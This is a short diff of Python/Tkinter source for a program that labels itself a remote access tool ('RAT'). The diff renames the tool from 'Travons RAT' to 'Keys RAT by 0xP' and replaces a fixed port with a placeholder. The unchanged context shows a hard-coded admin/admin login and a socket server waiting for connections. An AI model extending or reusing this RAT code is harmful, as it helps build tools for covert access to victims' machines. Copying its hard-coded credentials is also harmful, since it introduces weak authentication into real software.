@@ -6,10 +6,10 @@ import socket
 from setuptools import Command
 
 host=socket.gethostname()
-port=9001
+port='Insert Port Here'
 
 root=Tk()
-root.title('Travons RAT')
+root.title('Keys RAT by 0xP')
 root.geometry('925x500+300+200')
 root.configure(bg="#fff")
 root.resizable(False,False)
@@ -19,7 +19,7 @@ def signin():
     password=code.get()
     
     if username=='admin' and password=='admin':
-        print('Welcome to Travon Remote Access Tool')
+        print('Welcome to KEYS Remote Access Tool')
         print(" Server is currently running @ ", host)
         print(" Waiting for any incoming connections...")
         c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
